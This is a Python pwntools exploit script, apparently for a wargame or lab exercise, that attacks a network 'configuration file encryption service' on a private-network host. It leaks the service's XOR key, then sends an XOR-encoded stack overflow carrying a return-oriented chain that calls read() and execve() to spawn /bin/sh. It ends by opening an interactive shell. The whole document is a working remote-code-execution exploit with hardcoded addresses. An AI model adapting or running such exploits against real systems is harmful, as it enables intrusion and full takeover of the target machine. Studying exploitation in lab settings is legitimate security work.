#!/usr/bin/python
from pwn import *
import struct
import re

cmd = "/bin/sh" + "\x00"

# Make the payload
def makePayload(payload):

	memory = 0x804b360
	binSH = memory + 1

	read = 0x8048860
	execve = 0x80489b0

	pppr = 0x08049529 # 0x804952c

	# Write to memory the /bin/sh string
	# read(0, memory, len(cmd))
	payload += p32(read)
	payload += p32(pppr)
	payload += p32(0)
	payload += p32(memory)
	payload += p32(len(cmd))

	# Call execve with the /bin/sh
	# execve(binSH, 0x00000000, 0x00000000)
	payload += p32(execve)
	payload += "AAAA"
	payload += p32(binSH)
	payload += "\x00"*4
	payload += "\x00"*4

	return payload


# Sending the data
def send(data):
	s.send("E" + struct.pack("I", len(data)) + data)

# Xor the payload
def xor(plain, key, keySize):
	return ''.join(chr(ord(plain[x])^ord(key[x % keySize])) for x in range(len(plain)))


# Initialize the connection
s = remote("192.168.159.130", 20002)
s.recvuntil("[-- Enterprise configuration file encryption service --]")

# Getting the xorkey
keySize = 128 # (unsigned int) * 32 = 128
send("\x00"*keySize)

s.recvuntil("]")
s.recv(4) # Getting the size
key = s.recv(4096)[1:]


# Getting the overflow
size = 131088
payload =  "A"*size

payload = makePayload(payload)


payload = xor(payload, key, keySize)
send(payload)
send("AAAA\x00")
s.recvuntil("]")



# Verifying the output
s.recv(4) # Getting the size
s.recv(4096) # Getting the encrypted file
s.sendline("Q") # Ending the script

s.sendline(cmd)

s.interactive()